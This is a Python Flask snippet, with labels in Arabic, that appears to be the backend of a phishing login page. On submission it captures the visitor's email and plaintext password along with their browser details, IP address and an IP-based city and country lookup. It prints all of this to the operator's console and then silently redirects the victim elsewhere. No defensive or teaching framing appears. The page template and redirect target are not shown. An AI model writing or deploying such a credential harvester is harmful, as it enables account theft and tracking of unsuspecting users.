@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr

        try:
            geo_info = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
            location = geo_info.get('city', 'غير معروف') + ", " + geo_info.get('country', 'غير معروف')
        except:
            location = "غير معروف"

        print("="*40)
        print(f"[+] تسجيل دخول جديد:")
        print(f"[+] البريد الإلكتروني: {email}")
        print(f"[+] كلمة السر: {password}")
        print(f"[+] IP Address: {ip_address}")
        print(f"[+] نوع الجهاز والمتصفح: {user_agent}")
        print(f"[+] موقع المستخدم: {location}")
        print("="*40)

        return redirect(redirect_url)

    return render_template_string(html_page)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
